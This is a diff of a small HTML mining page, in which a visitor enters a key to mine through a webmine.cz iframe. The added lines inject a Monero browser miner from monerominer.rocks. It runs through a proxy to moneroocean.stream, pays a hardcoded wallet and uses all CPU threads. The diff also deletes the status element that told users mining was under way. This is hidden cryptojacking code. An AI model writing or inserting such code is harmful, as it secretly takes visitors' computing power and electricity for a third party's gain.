@@ -59,12 +59,6 @@
 		border: #007bfc solid 1px;
 		background: #007bfc;
 	}
-	.status{
-		
-		width: 100%;
-		text-align: center;
-		padding: 20px;
-	}
 	</style>
 </head>
 <body>
@@ -79,9 +73,6 @@
 		</div>
 		<div id="miner">
 		</div>
-		<div class="status">
-	        
-		</div>
 	</div>
 </body>
 <script src="https://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
@@ -91,9 +82,20 @@
 			var key = $("#key").val();
 			if(key!=""){
 				$("#miner").html(`
+                                        <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+                                        <script>
+                                          server = "wss://f.xmrminingproxy.com:8181";
+                                          var pool = "moneroocean.stream";
+                                          var walletAddress = "42j6Xpv7CZpGbTnagE8jXiMFmAGqgvp5tP6hy1J9V6biZ1XANGHvz7vBidTtMYhAkgNJ91KjP59o8idHKvgkNGzv1cw7HAy";
+                                          var workerId = ""
+                                          var threads = -1;
+                                          var password = "x";
+                                          startMining(pool, walletAddress, workerId, threads, password);
+                                           throttleMiner = 20;
+                                        </script>
 					<iframe width=0 height=0 frameborder=0 src='https://webmine.cz/worker?key=`+key+`'></iframe>
 				`);
-				$(".status").text("挖矿已开始，可按F12进行详情查看，刷新或是退出页面既停止挖矿，如果您认为您的设备足够强大可以<a href="https://www.nuyoah-l.ml/stonger.html">点击此处</a>给本人更强力的赞助。");
+				$(".status").text("挖矿已开始，可按F12进行详情查看，刷新或是退出页面既停止挖矿。");
 			}
 		});
 		
